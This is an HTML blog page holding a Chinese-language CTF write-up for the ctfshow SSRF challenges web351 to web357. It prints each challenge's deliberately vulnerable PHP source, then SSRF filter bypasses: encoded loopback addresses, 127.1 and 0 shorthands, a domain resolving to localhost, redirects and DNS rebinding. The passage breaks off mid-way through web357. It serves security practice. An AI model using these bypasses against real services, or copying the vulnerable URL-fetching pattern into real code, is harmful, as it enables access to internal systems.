@@ -1,0 +1,370 @@
+<!DOCTYPE html>
+<html  lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <link rel="icon" href="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202411051423199.svg">
+    <script>
+    ;(function () {
+      const prefersDark =
+        window.matchMedia &&
+        window.matchMedia('(prefers-color-scheme: dark)').matches
+      const setting = localStorage.getItem('vueuse-color-scheme') || 'auto'
+      if (setting === 'dark' || (prefersDark && setting !== 'light'))
+        document.documentElement.classList.toggle('dark', true)
+    })()
+    </script>
+  <style type="text/css">
+    :root { color-scheme: light dark; --va-c-bg: #fff; }
+    html.dark { --va-c-bg: #000; }
+    html { background-color: var(--va-c-bg); }
+  </style><style id="valaxy-fouc">body{opacity:0!important}</style><style>body{transition:opacity .15s ease}</style><noscript><style>body{opacity:1!important}</style></noscript><script>(function foucGuardScript(maxDuration) {
+  var done = 0;
+  function reveal() {
+    if (done) return;
+    done = 1;
+    var s = document.getElementById("valaxy-fouc");
+    if (s) s.remove();
+  }
+  function check() {
+    var links = document.querySelectorAll('link[rel="stylesheet"]');
+    for (var i = 0; i < links.length; i++) {
+      if (!links[i].sheet) return;
+    }
+    reveal();
+  }
+  new MutationObserver(check).observe(document.head, {
+    childList: true,
+    attributes: true,
+    attributeFilter: ["media", "rel"]
+  });
+  addEventListener("load", reveal);
+  if (maxDuration)
+    setTimeout(reveal, maxDuration);
+})(5000)</script>
+    <script>
+    const locale = localStorage.getItem('valaxy-locale') || 'zh-CN';
+    document.documentElement.setAttribute('lang', locale);
+    </script>
+    
+  <script type="module" crossorigin src="/assets/index.DMmPyM9k.js"></script>
+  <link rel="modulepreload" crossorigin href="/assets/rolldown-runtime.CPPQDwIl.js">
+  <link rel="modulepreload" crossorigin href="/assets/framework.DfD1zdSt.js">
+  <link rel="modulepreload" crossorigin href="/assets/chunks/vue-i18n.BSMUyWAh.js">
+  <link rel="modulepreload" crossorigin href="/assets/chunks/@vueuse/motion.B1bNFY-Z.js">
+  <link rel="modulepreload" crossorigin href="/assets/chunks/dayjs.Do72Hm6d.js">
+  <link rel="modulepreload" crossorigin href="/assets/chunks/pinia.CMOAtTts.js">
+  <link rel="modulepreload" crossorigin href="/assets/chunks/vue-router.DZdD3Cav.js">
+  <link rel="modulepreload" crossorigin href="/assets/theme.DMgGaAyl.js">
+  <link rel="modulepreload" crossorigin href="/assets/chunks/nprogress.CQax14yo.js">
+  <link rel="stylesheet" crossorigin href="/assets/style.BqWFzkuS.css">
+<link rel="preload" href="/assets/KaTeX_AMS-Regular.BQhdFMY1.woff2" as="font" type="font/woff2" crossorigin>
+<link rel="preload" href="/assets/KaTeX_AMS-Regular.DMm9YOAa.woff" as="font" type="font/woff" crossorigin>
+<link rel="preload" href="/assets/KaTeX_Caligraphic-Bold.Dq_IR9rO.woff2" as="font" type="font/woff2" crossorigin>
+<link rel="preload" href="/assets/KaTeX_Caligraphic-Bold.BEiXGLvX.woff" as="font" type="font/woff" crossorigin>
+<link rel="preload" href="/assets/KaTeX_Caligraphic-Regular.Di6jR-x-.woff2" as="font" type="font/woff2" crossorigin>
+<link rel="preload" href="/assets/KaTeX_Caligraphic-Regular.CTRA-rTL.woff" as="font" type="font/woff" crossorigin>
+<link rel="preload" href="/assets/KaTeX_Fraktur-Bold.CL6g_b3V.woff2" as="font" type="font/woff2" crossorigin>
+<link rel="preload" href="/assets/KaTeX_Fraktur-Bold.BsDP51OF.woff" as="font" type="font/woff" crossorigin>
+<link rel="preload" href="/assets/KaTeX_Fraktur-Regular.CTYiF6lA.woff2" as="font" type="font/woff2" crossorigin>
+<link rel="preload" href="/assets/KaTeX_Fraktur-Regular.Dxdc4cR9.woff" as="font" type="font/woff" crossorigin>
+<link rel="preload" href="/assets/KaTeX_Main-Bold.Cx986IdX.woff2" as="font" type="font/woff2" crossorigin>
+<link rel="preload" href="/assets/KaTeX_Main-Bold.Jm3AIy58.woff" as="font" type="font/woff" crossorigin>
+<link rel="preload" href="/assets/KaTeX_Main-BoldItalic.DxDJ3AOS.woff2" as="font" type="font/woff2" crossorigin>
+<link rel="preload" href="/assets/KaTeX_Main-BoldItalic.SpSLRI95.woff" as="font" type="font/woff" crossorigin>
+<link rel="preload" href="/assets/KaTeX_Main-Italic.NWA7e6Wa.woff2" as="font" type="font/woff2" crossorigin>
+<link rel="preload" href="/assets/KaTeX_Main-Italic.BMLOBm91.woff" as="font" type="font/woff" crossorigin>
+<link rel="preload" href="/assets/KaTeX_Main-Regular.B22Nviop.woff2" as="font" type="font/woff2" crossorigin>
+<link rel="preload" href="/assets/KaTeX_Main-Regular.Dr94JaBh.woff" as="font" type="font/woff" crossorigin>
+<link rel="preload" href="/assets/KaTeX_Math-BoldItalic.CZnvNsCZ.woff2" as="font" type="font/woff2" crossorigin>
+<link rel="preload" href="/assets/KaTeX_Math-BoldItalic.iY-2wyZ7.woff" as="font" type="font/woff" crossorigin>
+<link rel="preload" href="/assets/KaTeX_Math-Italic.t53AETM-.woff2" as="font" type="font/woff2" crossorigin>
+<link rel="preload" href="/assets/KaTeX_Math-Italic.DA0__PXp.woff" as="font" type="font/woff" crossorigin>
+<link rel="preload" href="/assets/KaTeX_SansSerif-Bold.D1sUS0GD.woff2" as="font" type="font/woff2" crossorigin>
+<link rel="preload" href="/assets/KaTeX_SansSerif-Bold.DbIhKOiC.woff" as="font" type="font/woff" crossorigin>
+<link rel="preload" href="/assets/KaTeX_SansSerif-Italic.C3H0VqGB.woff2" as="font" type="font/woff2" crossorigin>
+<link rel="preload" href="/assets/KaTeX_SansSerif-Italic.DN2j7dab.woff" as="font" type="font/woff" crossorigin>
+<link rel="preload" href="/assets/KaTeX_SansSerif-Regular.DDBCnlJ7.woff2" as="font" type="font/woff2" crossorigin>
+<link rel="preload" href="/assets/KaTeX_SansSerif-Regular.CS6fqUqJ.woff" as="font" type="font/woff" crossorigin>
+<link rel="preload" href="/assets/KaTeX_Script-Regular.D3wIWfF6.woff2" as="font" type="font/woff2" crossorigin>
+<link rel="preload" href="/assets/KaTeX_Script-Regular.D5yQViql.woff" as="font" type="font/woff" crossorigin>
+<link rel="preload" href="/assets/KaTeX_Size1-Regular.mCD8mA8B.woff2" as="font" type="font/woff2" crossorigin>
+<link rel="preload" href="/assets/KaTeX_Size1-Regular.C195tn64.woff" as="font" type="font/woff" crossorigin>
+<link rel="preload" href="/assets/KaTeX_Size2-Regular.Dy4dx90m.woff2" as="font" type="font/woff2" crossorigin>
+<link rel="preload" href="/assets/KaTeX_Size2-Regular.oD1tc_U0.woff" as="font" type="font/woff" crossorigin>
+<link rel="preload" href="/assets/KaTeX_Size3-Regular.CTq5MqoE.woff" as="font" type="font/woff" crossorigin>
+<link rel="preload" href="/assets/KaTeX_Size4-Regular.Dl5lxZxV.woff2" as="font" type="font/woff2" crossorigin>
+<link rel="preload" href="/assets/KaTeX_Size4-Regular.BF-4gkZK.woff" as="font" type="font/woff" crossorigin>
+<link rel="preload" href="/assets/KaTeX_Typewriter-Regular.CO6r4hn1.woff2" as="font" type="font/woff2" crossorigin>
+<link rel="preload" href="/assets/KaTeX_Typewriter-Regular.C0xS9mPB.woff" as="font" type="font/woff" crossorigin>
+<link rel="modulepreload" crossorigin href="/assets/theme.DMgGaAyl.js">
+<link rel="preload" href="/assets/none.DLM1AMsD.jpg" as="image">
+<link rel="preload" href="/assets/bg-img.kXdNMxcF.jpg" as="image">
+<link rel="preload" href="/assets/sidebar-bg-img.mp54gEws.webp" as="image">
+<link rel="modulepreload" crossorigin href="/assets/ctfshow-ssrf.Dr58xeMy.js">
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>ctfshow ssrf - 北沐城歌</title>
+<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Noto+Serif+SC:wght@900&display=swap">
+<meta property="og:locale:alternate" content="en">
+<meta name="description" content="山行野宿，孤身万里">
+<meta property="og:description" content="山行野宿，孤身万里">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:site_name" content="北沐城歌">
+<meta property="og:title" content="ctfshow ssrf">
+<meta property="og:image" content="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202409041931402.png">
+<meta property="og:type" content="website">
+<meta property="og:url" content="https://kinsey973.github.io/">
+<link rel="icon" href="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202411051423199.svg" type="image/svg+xml">
+<meta name="generator" content="Valaxy 0.28.7">
+<meta name="theme-color" content="#fff">
+<meta name="msapplication-TileColor" content="#fff">
+<meta name="twitter:card" content="summary_large_image">
+</head>
+<body>
+  <div id="app"><!--[--><!--[--><!--[--><!----><!----><div class="yun-page-header-gradient"></div><div class="yun-nav-menu z-$yun-z-nav-menu fixed bg-transparent" data-v-1791e522><div class="inline-flex justify-start items-center flex-1" data-v-1791e522><button type="button" class="vt-hamburger menu-btn sidebar-toggle leading-4 size-12 lg:hidden" aria-label="mobile navigation" aria-expanded="false" inline-flex cursor="pointer" hover="bg-white/80 dark:bg-black/80" z="$yun-z-menu-btn" data-v-1791e522><span class="vt-hamburger-container"><span class="vt-hamburger-top"></span><span class="vt-hamburger-middle"></span><span class="vt-hamburger-bottom"></span></span></button><a href="/" class="va-link size-12 inline-flex-center cursor-pointer z-$yun-z-nav-menu text-$va-c-text" hover="bg-white/80 dark:bg-black/80 op-100" op-80 data-v-1791e522><!--[--><div class="size-6 i-ri-home-4-line"></div><!--]--></a><div class="hidden lg:contents" data-v-1791e522><!--[--><a href="/posts/" class="va-link size-12 inline-flex-center cursor-pointer z-$yun-z-nav-menu text-$va-c-text" hover="bg-white/80 dark:bg-black/80 op-100" op-80 title="menu.posts" data-v-1791e522><!--[--><div class="size-6 i-ri-article-line"></div><!--]--></a><!--]--></div></div><div class="flex flex-1 flex-center" data-v-1791e522><div flex="~ center col h-full" class="nav-menu-title-container cursor-pointer" data-v-1791e522><!----><span class="font-light truncate">北沐城歌</span></div></div><div class="inline-flex-center justify-end items-center flex-1" data-v-1791e522><button class="yun-icon-btn rounded-none! hidden sm:inline-flex" title="切换语言" style="color:var(--va-c-text);" data-v-1791e522><div i-ri-translate class="transition transform"></div></button><button class="yun-icon-btn yun-toggle-dark rounded-none!" title="切换深色模式" data-v-1791e522><div i="ri-sun-line dark:ri-moon-line"></div></button><!--[--><button class="yun-search-btn yun-icon-btn popup-trigger rounded-none! size-12 inline-flex justify-center items-center" text="xl $va-c-text" title="搜索"><div i-ri-search-line op-80 hover="op-100"></div></button><!----><!--]--></div></div><!----><!----><!----><!--[--><div class="yun-bg"></div><!--]--><!----><a href="#" class="back-to-top yun-icon-btn bg-$va-c-bg-soft shadow-md"><div class="size-8" i-ri-arrow-up-s-line></div><svg class="progress-circle-container" viewBox="0 0 100 100"><circle stroke-dasharray="301.59289474462014 301.59289474462014" stroke-dashoffset="301.59289474462014" stroke="currentColor" stroke-width="2" stroke-linecap="round" class="progress-circle" cx="50" cy="50" r="48" fill="none"></circle></svg></a><!--]--><!--[--><meting-js fixed="true" id="2049540645" server="netease" type="song" mini="true" mutex="false" listFolded="false" style=""></meting-js><!--]--><!----><!--]--><div class="min-h-screen flex flex-col"><div class="mt-12 md:mt-24 yun-layout-wrapper__content"><!--[--><div class="yun-layout-left gap-4 sticky top-$yun-margin-top w-80"><!--[--><div class="yun-card flex-center rounded-2 overflow-hidden p-4 min-h-sm" flex="~ col gap-1" min-h="100px" bg="$va-c-bg-light"><!----><!----><div class="yun-card-body relative" w="full" flex="~ col" items="center"><!--[--><div class="site-info gap-1 items-center text-center" flex="~ col" p="t-8"><a href="/about" class="site-author-avatar inline-flex-center"><div class="relative yun-author-avatar"><div class="absolute size-full avatar-bg bg-image-$yun-home-hero-image-background-image filter-blur-2xl op-30"></div><img class="rounded-full size-full bg-white dark:bg-white/20 p-1 m-0 absolute" src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202410261321057.png" alt="avatar"><span class="site-author-status absolute" title="The moonlight is beautiful.">💛</span></div></a><a href="/about" class="site-author-name font-black font-serif text-$va-c-text op-80 hover:op-100 flex-center">北歌</a><a href="/about/site" class="site-name text-lg leading-loose">北沐城歌</a><h4 class="site-subtitle block op-70" text="xs">北沐城歌|北歌的技术分享</h4><div class="site-description">山行野宿，孤身万里</div></div><div class="yun-gradient-line my-2 op-20"></div><nav class="site-nav" text-xl mt-2><a href="/archives/" class="post-classify-nav-item gap-1 w-20 p-2 rounded transition op-80" flex="~ col center" title="归档" hover="bg-$va-c-bg-soft op-100"><div flex="~ col" class="text-$va-c-text inline-flex-center gap-1"><div class="text-2xl icon-default i-ri-archive-line"></div><div class="text-2xl icon-active i-ri-archive-fill"></div><span class="text-xs">归档</span></div><span class="count text-base text-black/80 dark:text-white/80">41</span></a><a href="/categories/" class="post-classify-nav-item gap-1 w-20 p-2 rounded transition op-80" flex="~ col center" title="分类" hover="bg-$va-c-bg-soft op-100"><div flex="~ col" class="text-$va-c-text inline-flex-center gap-1"><div class="text-2xl icon-default i-ri-folder-2-line"></div><div class="text-2xl icon-active i-ri-folder-2-fill"></div><span class="text-xs">分类</span></div><span class="count text-base text-black/80 dark:text-white/80">6</span></a><a href="/tags/" class="post-classify-nav-item gap-1 w-20 p-2 rounded transition op-80" flex="~ col center" title="标签" hover="bg-$va-c-bg-soft op-100"><div flex="~ col" class="text-$va-c-text inline-flex-center gap-1"><div class="text-2xl icon-default i-ri-price-tag-3-line"></div><div class="text-2xl icon-active i-ri-price-tag-3-fill"></div><span class="text-xs">标签</span></div><span class="count text-base text-black/80 dark:text-white/80">26</span></a></nav><div class="yun-gradient-line my-2 op-20"></div><div class="links-of-author"><!--[--><a class="links-of-author-item yun-icon-btn" rel="noopener" href="/atom.xml" title="RSS" target="_blank" style="color:orange;"><div class="i-ri-rss-line icon"></div></a><a class="links-of-author-item yun-icon-btn" rel="noopener" href="https://music.163.com/#/user/home?id=3954596483" title="网易云音乐" target="_blank" style="color:#C20C0C;"><div class="i-ri-netease-cloud-music-line icon"></div></a><a class="links-of-author-item yun-icon-btn" rel="noopener" href="https://qm.qq.com/cgi-bin/qm/qr?k=kZJzggTTCf4SpvEQ8lXWoi5ZjhAx0ILZ&amp;jump_from=webapi" title="QQ 2409101203" target="_blank" style="color:#12B7F5;"><div class="i-ri-qq-line icon"></div></a><a class="links-of-author-item yun-icon-btn" rel="noopener" href="https://github.com/kinsey973" title="GitHub" target="_blank" style="color:#6e5494;"><div class="i-ri-github-line icon"></div></a><a class="links-of-author-item yun-icon-btn" rel="noopener" href="https://travellings.link" title="Travelling" target="_blank" style="color:white;"><div class="i-ri-train-line icon"></div></a><!--]--></div><div class="yun-gradient-line my-2 op-20"></div><div class="links flex-center"><!--[--><a href="/links/" class="va-link link-item yun-icon-btn" inline-flex title="网络世界的小伙伴们" style="color:hotpink;"><!--[--><div class="i-ri-open-arm-line icon size-6"></div><!--]--></a><a class="va-link link-item yun-icon-btn" inline-flex title="我的旧博客" style="color:#e16f00;" href="https://kinseyy.github.io/" target="_blank"><!--[--><div class="i-ri-quill-pen-line icon size-6"></div><!--]--><!----></a><a href="/categories/" class="va-link link-item yun-icon-btn" inline-flex title="分类" style="color:#f5f5f5;"><!--[--><div class="i-ri-apps-line icon size-6"></div><!--]--></a><a href="/tags/" class="va-link link-item yun-icon-btn" inline-flex title="标签" style="color:#f5f5f5;"><!--[--><div class="i-ri-bookmark-3-line icon size-6"></div><!--]--></a><!--]--></div><!--]--></div><!----></div><template></template><!--]--></div><main class="yun-main lt-md:w-full" flex="~ center"><!--[--><div class="content w-full md:w-3xl lg:w-2xl xl:w-2xl 2xl:w-4xl" flex="~ col grow" p="lt-md:0"><div class="yun-card flex-center rounded-2 overflow-hidden" flex="col" min-h="100px" bg="$va-c-bg-light" m="0"><!----><!----><div class="yun-card-body relative" w="full" flex="~ col" items="center"><!--[--><!----><div class="mt-8 mb-4"><!--[--><header class="post-header"><h1 p="2" text="2xl center" font="serif black" style="color:" class="post-title flex-center"><!----><span inline-flex class="leading-none">ctfshow ssrf</span></h1></header><!--]--></div><!--[--><!--[--><!--[--><!--[--><!----><div flex="~ center" text="sm" class="post-meta-col post-meta gap-4"><div class="post-time flex items-center gap-4"><span class="posted-time inline-flex-center gap-1" title="发表于2024-09-03 15:32:45"><div class="inline-block" i-ri-calendar-line></div><time class="op-80">2024-09-03</time></span><!----></div><!--[--><span id="busuanzi_container_page_pv"> 本文总阅读量 <span id="busuanzi_value_page_pv"></span> 次 </span><!--]--><div class="inline-flex-center gap-4"><div class="inline-flex-center post-counter gap-4"><span class="word-count inline-flex-center gap-1" title="本文字数"><div class="inline-block" i-ri-file-word-line></div><span class="op-80">3.5k</span></span><span class="reading-time inline-flex-center gap-1" title="阅读时长"><div i-ri-timer-line></div><time class="op-80">15m</time></span></div><!----><!----></div></div><!--]--><!----><div class="inline-flex mt-2" text="sm" py="1"><a href="/categories?category=%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0" class="transition post-category inline-flex-center text-xs border-$va-c-divider" px-2 h="7" border rounded-full hover="bg-blue-500 text-white"><div m="x-1" inline-flex i-ri-folder-2-line></div><span>学习笔记</span></a><span mx="2"></span><div class="post-tags inline-flex" items="center" gap="1" flex="wrap 1" justify="end"><!--[--><a href="/tags/?tag=ssrf" class="transition post-tag inline-flex-center text-xs border-$va-c-divider" px-2 h="7" rounded-full border hover="bg-blue-500 text-white"><span>ssrf</span></a><a href="/tags/?tag=ctfshow" class="transition post-tag inline-flex-center text-xs border-$va-c-divider" px-2 h="7" rounded-full border hover="bg-blue-500 text-white"><span>ctfshow</span></a><!--]--></div></div><!--]--><!--]--><!--]--><div p="x-4 b-8" class="sm:px-6 lg:px-12 xl:px-16" w="full"><!--[--><!--]--><!--[--><article class="markdown-body"><!--[--><!----><!----><!--[--><!--]--><!--[--><p>摘要：<a href="http://t.csdnimg.cn/21MYs" target="_blank" rel="noreferrer">http://t.csdnimg.cn/21MYs</a> web351 存在一个flag.php页面，访问会返回不是本地用户的消息，那肯定是要让我们以本地用户去访问127.0.0.1/flag.php 得到flag web352 parseurl 解析 URL 并返回关联数组，包含在 URL 中出现的各种。</p><p>&lt;!-- more --&gt;</p><p><a href="http://t.csdnimg.cn/21MYs" target="_blank" rel="noreferrer">http://t.csdnimg.cn/21MYs</a></p><h3 id="web351" tabindex="-1">web351 <a class="header-anchor" href="#web351" aria-label="Permalink to &quot;web351&quot;">​</a></h3><div class="language-"><button title="Copy code" class="copy"></button><span class="lang"></span><pre><code>&lt;?php
+error_reporting(0);
+highlight_file(__FILE__);
+$url=$_POST[&#39;url&#39;];
+//初始化一个cURL会话
+$ch=curl_init($url);
+//设定返回信息中包含响应信息头
+curl_setopt($ch, CURLOPT_HEADER, 0);
+//启用时会将头文件的信息作为数据流输出。 
+//参数为1表示输出信息头,为0表示不输出
+
+//设定curl_exec()函数将响应结果返回，而不是直接输出
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+//参数为1表示$result,为0表示echo $result
+
+//执行一个cURL会话
+$result=curl_exec($ch);
+//关闭一个curl会话
+curl_close($ch);
+//输出返回信息  如果CURLOPT_RETURNTRANSFER参数为fasle可省略
+echo ($result);
+?&gt;
+</code></pre><button class="code-block-unfold-btn"></button></div><p>存在一个flag.php页面，访问会返回不是本地用户的消息，那肯定是要让我们以本地用户去访问127.0.0.1/flag.php</p><div class="language-"><button title="Copy code" class="copy"></button><span class="lang"></span><pre><code>url=http://127.0.0.1/flag.php
+
+</code></pre><button class="code-block-unfold-btn"></button></div><p>得到flag</p><h3 id="web352" tabindex="-1">web352 <a class="header-anchor" href="#web352" aria-label="Permalink to &quot;web352&quot;">​</a></h3><div class="language-"><button title="Copy code" class="copy"></button><span class="lang"></span><pre><code>&lt;?php
+error_reporting(0);
+highlight_file(__FILE__);
+$url=$_POST[&#39;url&#39;];
+$x=parse_url($url);
+if($x[&#39;scheme&#39;]===&#39;http&#39;||$x[&#39;scheme&#39;]===&#39;https&#39;){
+if(!preg_match(&#39;/localhost|127.0.0/&#39;)){
+$ch=curl_init($url);
+curl_setopt($ch, CURLOPT_HEADER, 0);
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+$result=curl_exec($ch);
+curl_close($ch);
+echo ($result);
+}
+else{
+    die(&#39;hacker&#39;);
+}
+}
+else{
+    die(&#39;hacker&#39;);
+}
+?&gt; 
+</code></pre><button class="code-block-unfold-btn"></button></div><p>parse_url</p><p>解析 URL 并返回关联数组，包含在 URL 中出现的各种组成部分。数组的元素值<em>不会</em> URL 解码。</p><p>代码中先判断是否为HTTP或https协议，之后判断我们传入的url中是否含有localhost和127.0.0，如果没有则执行下面语句</p><p>过滤掉了localhost和127.0.0</p><p>可以用127.0.1 、127.1、 127。0.0.1 或者转成16进制 2进制 进行</p><div class="language-"><button title="Copy code" class="copy"></button><span class="lang"></span><pre><code>url=http://0x7F.0.0.1/flag.php   16进制
+url=http://0177.0.0.1/flag.php    8进制
+url=http://0.0.0.0/flag.php
+url=http://0/flag.php
+url=http://127.127.127.127/flag.php
+
+</code></pre><button class="code-block-unfold-btn"></button></div><h3 id="web353" tabindex="-1">web353 <a class="header-anchor" href="#web353" aria-label="Permalink to &quot;web353&quot;">​</a></h3><div class="language-"><button title="Copy code" class="copy"></button><span class="lang"></span><pre><code>&lt;?php
+error_reporting(0);
+highlight_file(__FILE__);
+$url=$_POST[&#39;url&#39;];
+$x=parse_url($url);
+if($x[&#39;scheme&#39;]===&#39;http&#39;||$x[&#39;scheme&#39;]===&#39;https&#39;){
+if(!preg_match(&#39;/localhost|127\.0\.|\。/i&#39;, $url)){
+$ch=curl_init($url);
+curl_setopt($ch, CURLOPT_HEADER, 0);
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+$result=curl_exec($ch);
+curl_close($ch);
+echo ($result);
+}
+else{
+    die(&#39;hacker&#39;);
+}
+}
+else{
+    die(&#39;hacker&#39;);
+}
+?&gt;
+</code></pre><button class="code-block-unfold-btn"></button></div><p>过滤更加严格，但可以使用进制变换，和上一题类似</p><p><a href="https://tool.520101.com/wangluo/jinzhizhuanhuan/" target="_blank" rel="noreferrer">IP地址进制转换网站</a></p><div class="language-"><button title="Copy code" class="copy"></button><span class="lang"></span><pre><code>十六进制
+url=http://0x7F.0.0.1/flag.php
+八进制
+url=http://0177.0.0.1/flag.php
+10 进制整数格式
+url=http://2130706433/flag.php
+16 进制整数格式，还是上面那个网站转换记得前缀0x
+url=http://0x7F000001/flag.php
+还有一种特殊的省略模式
+127.0.0.1写成127.1
+用CIDR绕过localhost
+url=http://127.127.127.127/flag.php
+url=http://0/flag.php
+url=http://0.0.0.0/flag.php
+
+</code></pre><button class="code-block-unfold-btn"></button></div><p>得到flag</p><h3 id="web354" tabindex="-1">web354 <a class="header-anchor" href="#web354" aria-label="Permalink to &quot;web354&quot;">​</a></h3><div class="language-"><button title="Copy code" class="copy"></button><span class="lang"></span><pre><code>&lt;?php
+error_reporting(0);
+highlight_file(__FILE__);
+$url=$_POST[&#39;url&#39;];
+$x=parse_url($url);
+if($x[&#39;scheme&#39;]===&#39;http&#39;||$x[&#39;scheme&#39;]===&#39;https&#39;){
+if(!preg_match(&#39;/localhost|1|0|。/i&#39;, $url)){
+$ch=curl_init($url);
+curl_setopt($ch, CURLOPT_HEADER, 0);
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+$result=curl_exec($ch);
+curl_close($ch);
+echo ($result);
+}
+else{
+    die(&#39;hacker&#39;);
+}
+}
+else{
+    die(&#39;hacker&#39;);
+}
+?&gt;
+</code></pre><button class="code-block-unfold-btn"></button></div><p>该题过滤了0和1</p><p>去了解了两种绕过方法：<a href="https://blog.csdn.net/weixin_44023442/article/details/113150211?spm=1001.2101.3001.6650.1&amp;utm_medium=distribute.pc_relevant.none-task-blog-2~default~CTRLIST~Rate-1.pc_relevant_default&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-2~default~CTRLIST~Rate-1.pc_relevant_default&amp;utm_relevant_index=2" target="_blank" rel="noreferrer">(151条消息) 【漏洞利用】SSRF漏洞挖掘利用、绕过技巧、防御修复详细解析_白丁Gorilla的博客-CSDN博客_java ssrf 修复</a></p><p>利用302跳转</p><p>如果后端服务器在接收到参数后，正确的解析了URL的host，并且进行了过滤，我们这个时候可以使用302跳转的方式来进行绕过。 <a href="http://xip.io" target="_blank" rel="noreferrer">http://xip.io</a> 当我们访问这个网站的子域名的时候，例如192.168.0.1.xip.io，就会自动重定向到192.168.0.1。</p><p>DNS Rebinding</p><p>对于用户请求的URL参数，首先服务器端会对其进行DNS解析，然后对于DNS服务器返回的IP地址进行判断，如果在黑名单中，就pass掉。</p><p>但是在整个过程中，第一次去请求DNS服务进行域名解析到第二次服务端去请求URL之间存在一个时间查，利用这个时间差，我们可以进行DNS 重绑定攻击。</p><p>要完成DNS重绑定攻击，我们需要一个域名，并且将这个域名的解析指定到我们自己的DNS Server，在我们的可控的DNS Server上编写解析服务，设置TTL时间为0。这样就可以进行攻击了，完整的攻击流程为：</p><div class="language-"><button title="Copy code" class="copy"></button><span class="lang"></span><pre><code>(1)、服务器端获得URL参数，进行第一次DNS解析，获得了一个非内网的IP
+
+(2)、对于获得的IP进行判断，发现为非黑名单IP，则通过验证
+
+(3)、服务器端对于URL进行访问，由于DNS服务器设置的TTL为0，所以再次进行DNS解析，这一次DNS服务器返回的是内网地址。
+
+(4)、由于已经绕过验证，所以服务器端返回访问内网资源的结果。
+
+</code></pre><button class="code-block-unfold-btn"></button></div><div class="language-"><button title="Copy code" class="copy"></button><span class="lang"></span><pre><code>1·修改自己域名的a记录，改成127.0.0.1
+
+2·这个网站a记录指向127.0.0.1 可以直接利用
+
+url=http://sudo.cc/flag.php
+
+</code></pre><button class="code-block-unfold-btn"></button></div><figure><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202409041931402.png" alt="image-20240904193106308" loading="lazy" decoding="async"></figure><h3 id="web355" tabindex="-1">web355 <a class="header-anchor" href="#web355" aria-label="Permalink to &quot;web355&quot;">​</a></h3><div class="language-"><button title="Copy code" class="copy"></button><span class="lang"></span><pre><code>&lt;?php
+error_reporting(0);
+highlight_file(__FILE__);
+$url=$_POST[&#39;url&#39;];
+$x=parse_url($url);
+if($x[&#39;scheme&#39;]===&#39;http&#39;||$x[&#39;scheme&#39;]===&#39;https&#39;){
+$host=$x[&#39;host&#39;];
+if((strlen($host)&lt;=5)){
+$ch=curl_init($url);
+curl_setopt($ch, CURLOPT_HEADER, 0);
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+$result=curl_exec($ch);
+curl_close($ch);
+echo ($result);
+}
+else{
+    die(&#39;hacker&#39;);
+}
+}
+else{
+    die(&#39;hacker&#39;);
+}
+?&gt;
+</code></pre><button class="code-block-unfold-btn"></button></div><p>这个题限制了host的长度，小于等于5，使用127.1省略绕过</p><div class="language-"><button title="Copy code" class="copy"></button><span class="lang"></span><pre><code>url=http://127.1/flag.php
+
+</code></pre><button class="code-block-unfold-btn"></button></div><figure><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202409041933748.png" alt="image-20240904193308711" loading="lazy" decoding="async"></figure><h3 id="web356" tabindex="-1">web356 <a class="header-anchor" href="#web356" aria-label="Permalink to &quot;web356&quot;">​</a></h3><div class="language-"><button title="Copy code" class="copy"></button><span class="lang"></span><pre><code>&lt;?php
+error_reporting(0);
+highlight_file(__FILE__);
+$url=$_POST[&#39;url&#39;];
+$x=parse_url($url);
+if($x[&#39;scheme&#39;]===&#39;http&#39;||$x[&#39;scheme&#39;]===&#39;https&#39;){
+$host=$x[&#39;host&#39;];
+if((strlen($host)&lt;=3)){
+$ch=curl_init($url);
+curl_setopt($ch, CURLOPT_HEADER, 0);
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+$result=curl_exec($ch);
+curl_close($ch);
+echo ($result);
+}
+else{
+    die(&#39;hacker&#39;);
+}
+}
+else{
+    die(&#39;hacker&#39;);
+}
+?&gt;
+</code></pre><button class="code-block-unfold-btn"></button></div><p>此题限制了host的长度小于等于3</p><p>0在 linux 系统中会解析成127.0.0.1在windows中解析成0.0.0.0</p><div class="language-"><button title="Copy code" class="copy"></button><span class="lang"></span><pre><code>url=http://0/flag.php
+
+</code></pre><button class="code-block-unfold-btn"></button></div><p>得到flag</p><h3 id="web357" tabindex="-1">web357 <a class="header-anchor" href="#web357" aria-label="Permalink to &quot;web357&quot;">​</a></h3><div class="language-"><button title="Copy code" class="copy"></button><span class="lang"></span><pre><code>&lt;?php
+error_reporting(0);
+highlight_file(__FILE__);
+$url=$_POST[&#39;url&#39;];
+$x=parse_url($url);
+if($x[&#39;scheme&#39;]===&#39;http&#39;||$x[&#39;scheme&#39;]===&#39;https&#39;){
+$ip = gethostbyname($x[&#39;host&#39;]);
+echo &#39;&lt;/br&gt;&#39;.$ip.&#39;&lt;/br&gt;&#39;;
+if(!filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE)) {
+    die(&#39;ip!&#39;);
+}
+
+echo file_get_contents($_POST[&#39;url&#39;]);
+}
+else{
+    die(&#39;scheme&#39;);
+}
+?&gt;
+</code></pre><button class="code-block-unfold-btn"></button></div><p>gethostbyname</p><p>主要作用：用域名或者主机名获取地址，操作系统提供的库函数。</p><p>成功返回的非空指针指向如下的hostent结构：</p><div class="language-"><button title="Copy code" class="copy"></button><span class="lang"></span><pre><code>struct hostent
+{
+      char *h_name;      //主机名
+      char **h_aliases;  //主机别名(指向到虚拟主机的域名)
+      int h_addrtype;    //主机IP地址类型
